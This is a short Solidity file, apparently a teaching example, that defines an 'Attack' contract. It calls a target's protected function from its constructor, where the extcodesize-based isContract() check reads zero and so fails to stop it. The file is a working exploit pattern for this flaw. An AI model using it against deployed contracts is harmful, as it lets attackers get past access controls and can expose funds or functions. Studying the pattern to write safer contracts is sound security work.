// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Target.sol";

contract Attack {
    bool public isContract;
    address public addr;

    // The contract is in the process of being created, 
    // hence the code size (extcodesize) is currently 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}
